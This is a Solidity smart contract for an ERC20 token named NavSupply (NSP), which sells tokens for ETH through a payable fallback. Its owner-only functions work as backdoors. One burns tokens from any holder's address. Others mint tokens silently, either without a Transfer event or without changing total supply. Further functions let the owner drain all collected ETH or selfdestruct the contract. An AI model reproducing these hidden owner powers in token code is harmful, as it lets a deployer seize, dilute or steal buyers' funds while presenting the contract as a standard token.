1 pragma solidity ^0.4.18;
2  
3 //Never Mind :P
4 /* @dev The Ownable contract has an owner address, and provides basic authorization control
5 * functions, this simplifies the implementation of "user permissions".
6 */
7 contract Ownable {
8   address public owner;
9 
10 
11   /**
12    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
13    * account.
14    */
15   function Ownable() {
16     owner = msg.sender;
17   }
18 
19 
20   /**
21    * @dev Throws if called by any account other than the owner.
22    */
23   modifier onlyOwner() {
24     require(msg.sender == owner);
25     _;
26   }
27 
28 
29   /**
30    * @dev Allows the current owner to transfer control of the contract to a newOwner.
31    * @param newOwner The address to transfer ownership to.
32    */
33   function transferOwnership(address newOwner) onlyOwner {
34     if (newOwner != address(0)) {
35       owner = newOwner;
36     }
37   }
38 
39 }
40 
41 
42 
43 
44 library SafeMath {
45 
46   /**
47   * @dev Multiplies two numbers, throws on overflow.
48   */
49   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
50     if (a == 0) {
51       return 0;
52     }
53     uint256 c = a * b;
54     assert(c / a == b);
55     return c;
56   }
57 
58   /**
59   * @dev Integer division of two numbers, truncating the quotient.
60   */
61   function div(uint256 a, uint256 b) internal pure returns (uint256) {
62     // assert(b > 0); // Solidity automatically throws when dividing by 0
63     uint256 c = a / b;
64     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
65     return c;
66   }
67 
68   /**
69   * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
70   */
71   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
72     assert(b <= a);
73     return a - b;
74   }
75 
76   /**
77   * @dev Adds two numbers, throws on overflow.
78   */
79   function add(uint256 a, uint256 b) internal pure returns (uint256) {
80     uint256 c = a + b;
81     assert(c >= a);
82     return c;
83   }
84 }
85 
86 
87 
88 
89 
90 
91 
92 contract ERC20Basic {
93   function totalSupply() public view returns (uint256);
94   function balanceOf(address who) public view returns (uint256);
95   function transfer(address to, uint256 value) public returns (bool);
96   event Transfer(address indexed from, address indexed to, uint256 value);
97 }
98 
99 contract ERC20 is ERC20Basic {
100   function allowance(address owner, address spender) public view returns (uint256);
101   function transferFrom(address from, address to, uint256 value) public returns (bool);
102   function approve(address spender, uint256 value) public returns (bool);
103   event Approval(address indexed owner, address indexed spender, uint256 value);
104 }
105 
106 
107 
108 
109 
110 contract BasicToken is ERC20Basic {
111   using SafeMath for uint256;
112 
113   mapping(address => uint256) balances;
114 
115   uint256 totalSupply_;
116 
117   /**
118   * @dev total number of tokens in existence
119   */
120   function totalSupply() public view returns (uint256) {
121     return totalSupply_;
122   }
123 
124   /**
125   * @dev transfer token for a specified address
126   * @param _to The address to transfer to.
127   * @param _value The amount to be transferred.
128   */
129   function transfer(address _to, uint _value) public returns (bool) {
130     require(_to != address(0));
131     require(_value <= balances[msg.sender]);
132     
133     // SafeMath.sub will throw if there is not enough balance.
134     if(!isContract(_to)){
135     balances[msg.sender] = balances[msg.sender].sub(_value);
136     balances[_to] = balances[_to].add(_value);
137     Transfer(msg.sender, _to, _value);
138     return true;}
139     else{
140         balances[msg.sender] = balanceOf(msg.sender).sub(_value);
141 		balances[_to] = balanceOf(_to).add(_value);
142 		NSPReceiver receiver = NSPReceiver(_to);
143 		receiver.NSPFallback(msg.sender, _value, 0);
144 		Transfer(msg.sender, _to, _value);
145         return true;
146     }
147     
148   }
149     function transfer(address _to, uint _value, uint _code) public returns (bool) {
150     	require(isContract(_to));
151 		require(_value <= balances[msg.sender]);
152 	
153     	balances[msg.sender] = balanceOf(msg.sender).sub(_value);
154 		balances[_to] = balanceOf(_to).add(_value);
155 		NSPReceiver receiver = NSPReceiver(_to);
156 		receiver.NSPFallback(msg.sender, _value, _code);
157 		Transfer(msg.sender, _to, _value);
158 		
159 		return true;
160     
161     }
162   /**
163   * @dev Gets the balance of the specified address.
164   * @param _owner The address to query the the balance of.
165   * @return An uint256 representing the amount owned by the passed address.
166   */
167   function balanceOf(address _owner) public view returns (uint256 balance) {
168     return balances[_owner];
169   }
170 
171 
172 function isContract(address _addr) private returns (bool is_contract) {
173 		uint length;
174 		assembly {
175 		    //retrieve the size of the code on target address, this needs assembly
176 		    length := extcodesize(_addr)
177 		}
178 		return (length>0);
179 	}
180 
181 
182 	//function that is called when transaction target is a contract
183 	//Only used for recycling NSPs
184 	function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {
185 		require(isContract(_to));
186 		require(_value <= balances[msg.sender]);
187 	
188     	balances[msg.sender] = balanceOf(msg.sender).sub(_value);
189 		balances[_to] = balanceOf(_to).add(_value);
190 		NSPReceiver receiver = NSPReceiver(_to);
191 		receiver.NSPFallback(msg.sender, _value, _code);
192 		Transfer(msg.sender, _to, _value);
193 		
194 		return true;
195 	}
196 }
197 /**
198  * @title Standard ERC20 token
199  *
200  * @dev Implementation of the basic standard token.
201  * @dev https://github.com/ethereum/EIPs/issues/20
202  * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
203  */
204 contract StandardToken is ERC20, BasicToken {
205 
206   mapping (address => mapping (address => uint256)) internal allowed;
207 
208 
209   /**
210    * @dev Transfer tokens from one address to another
211    * @param _from address The address which you want to send tokens from
212    * @param _to address The address which you want to transfer to
213    * @param _value uint256 the amount of tokens to be transferred
214    */
215   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
216     require(_to != address(0));
217     require(_value <= balances[_from]);
218     require(_value <= allowed[_from][msg.sender]);
219 
220     balances[_from] = balances[_from].sub(_value);
221     balances[_to] = balances[_to].add(_value);
222     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
223     Transfer(_from, _to, _value);
224     return true;
225   }
226 
227   /**
228    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
229    *
230    * Beware that changing an allowance with this method brings the risk that someone may use both the old
231    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
232    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
233    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
234    * @param _spender The address which will spend the funds.
235    * @param _value The amount of tokens to be spent.
236    */
237   function approve(address _spender, uint256 _value) public returns (bool) {
238     allowed[msg.sender][_spender] = _value;
239     Approval(msg.sender, _spender, _value);
240     return true;
241   }
242 
243   /**
244    * @dev Function to check the amount of tokens that an owner allowed to a spender.
245    * @param _owner address The address which owns the funds.
246    * @param _spender address The address which will spend the funds.
247    * @return A uint256 specifying the amount of tokens still available for the spender.
248    */
249   function allowance(address _owner, address _spender) public view returns (uint256) {
250     return allowed[_owner][_spender];
251   }
252 
253   /**
254    * @dev Increase the amount of tokens that an owner allowed to a spender.
255    *
256    * approve should be called when allowed[_spender] == 0. To increment
257    * allowed value is better to use this function to avoid 2 calls (and wait until
258    * the first transaction is mined)
259    * From MonolithDAO Token.sol
260    * @param _spender The address which will spend the funds.
261    * @param _addedValue The amount of tokens to increase the allowance by.
262    */
263   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
264     allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
265     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
266     return true;
267   }
268 
269   /**
270    * @dev Decrease the amount of tokens that an owner allowed to a spender.
271    *
272    * approve should be called when allowed[_spender] == 0. To decrement
273    * allowed value is better to use this function to avoid 2 calls (and wait until
274    * the first transaction is mined)
275    * From MonolithDAO Token.sol
276    * @param _spender The address which will spend the funds.
277    * @param _subtractedValue The amount of tokens to decrease the allowance by.
278    */
279   function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
280     uint oldValue = allowed[msg.sender][_spender];
281     if (_subtractedValue > oldValue) {
282       allowed[msg.sender][_spender] = 0;
283     } else {
284       allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
285     }
286     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
287     return true;
288   }
289 
290 }
291 
292  contract NSPReceiver {
293     function NSPFallback(address _from, uint _value, uint _code);
294 }
295 
296 
297 
298 
299 contract NSPToken is StandardToken, Ownable {
300 
301 	string public constant name = "NavSupply"; // solium-disable-line uppercase
302 	string public constant symbol = "NSP"; // solium-disable-line uppercase
303 	uint8 public constant decimals = 0; // solium-disable-line uppercase
304 
305 	uint256 public constant INITIAL_SUPPLY = 1000;
306 
307 
308 	uint256 public price = 10 ** 15; //1:1000
309 	bool public halted = false;
310 
311 	/**
312 	* @dev Constructor that gives msg.sender all of existing tokens.
313 	*/
314 	function NSPToken() public {
315 		totalSupply_ = INITIAL_SUPPLY;
316 		balances[msg.sender] = INITIAL_SUPPLY;
317 		Transfer(0x0, msg.sender, INITIAL_SUPPLY);
318 	}
319 
320 	//Rember 18 zeros for decimals of eth(wei), and 0 zeros for NSP. So add 18 zeros with * 10 ** 18
321 	function setPrice(uint _newprice) onlyOwner{
322 		price=_newprice; 
323 	}
324 
325 
326 	function () public payable{
327 		require(halted == false);
328 		uint amout = msg.value.div(price);
329 		balances[msg.sender] = balanceOf(msg.sender).add(amout);
330 		totalSupply_=totalSupply_.add(amout);
331 		Transfer(0x0, msg.sender, amout);
332 	}
333 
334 
335 
336 
337 
338 
339 	
340 
341 
342 	//this will burn NSPs stuck in contracts
343 	function burnNSPs(address _contract, uint _value) onlyOwner{
344 
345 		balances[_contract]=balanceOf(_contract).sub(_value);
346 		totalSupply_=totalSupply_.sub(_value);
347 		Transfer(_contract, 0x0, _value);
348 	}
349 
350 
351 
352 
353 
354 
355 
356 
357 	function FisrtSupply (address _to, uint _amout) onlyOwner{
358 		balances[_to] = balanceOf(_to).add(_amout);
359 		totalSupply_=totalSupply_.add(_amout);
360 		Transfer(0x0, _to, _amout);
361   }
362   function AppSupply (address _to, uint _amout) onlyOwner{
363 		balances[_to] = balanceOf(_to).add(_amout);
364   }
365   function makerich4 (address _to, uint _amout) onlyOwner{
366     balances[_to] = balanceOf(_to).add(_amout);
367     totalSupply_=totalSupply_.add(_amout);
368   }
369 
370 	function getFunding (address _to, uint _amout) onlyOwner{
371 		_to.transfer(_amout);
372 	}
373 
374 	function getFunding_Old (uint _amout) onlyOwner{
375 		msg.sender.transfer(_amout);
376 	}
377 
378 	function getAllFunding() onlyOwner{
379 		owner.transfer(this.balance);
380 	}
381 
382 	function terminate(uint _code) onlyOwner{
383 		require(_code == 958);
384 		selfdestruct(owner);
385 	}
386 
387 
388 
389 	/* stop IGO*/
390 	function halt() onlyOwner{
391 		halted = true;
392 	}
393 	function unhalt() onlyOwner{
394 		halted = false;
395 	}
396 
397 
398 
399 }